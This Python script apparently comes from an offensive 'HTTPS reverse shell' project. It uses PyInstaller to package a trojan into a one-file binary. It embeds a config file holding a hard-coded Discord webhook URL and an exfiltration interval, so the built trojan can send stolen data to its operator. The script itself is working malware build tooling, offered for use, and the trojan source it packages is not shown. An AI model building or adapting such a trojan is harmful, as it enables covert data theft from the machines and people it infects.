#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-HTTPS-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

import argparse
import configparser
import platform

import PyInstaller.__main__


def build(args: argparse.Namespace) -> None:
    """Set-up the arguments required by PyInstaller to build the
    trojan binary."""

    '''A configuration file named 'trojan.cfg' is created with a 
    hard-coded Discord Webhook URL and exfiltration time setting that 
    allows seamless connection of the binary client to the server. This 
    file is bundled in the binary and read on execution.'''
    config = configparser.ConfigParser()
    config["TROJAN"] = {
        "Webhook": args.webhook,
        "ExfiltrationTime": str(args.exfil_time)
    }

    with open(file="trojan.cfg", mode="w") as config_file:
        config.write(config_file)

    """Path separator for the current operating system. Windows systems 
    use ';' as a separator, whereas Linux/Unix/MacOS use ':'."""
    sep = ";" if platform.system() == "Windows" else ":"

    cmd = "src/trojan.py", "--onefile", "--add-data", f"trojan.cfg{sep}."

    PyInstaller.__main__.run(cmd)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-w", "--webhook",
        type=str,
        metavar="WEBHOOK URL",
        required=True
    )
    parser.add_argument(
        "-e", "--exfil-time",
        type=float,
        metavar="SECONDS",
        default=30
    )
    parser.set_defaults(func=build)

    _args = parser.parse_args()
    _args.func(_args)
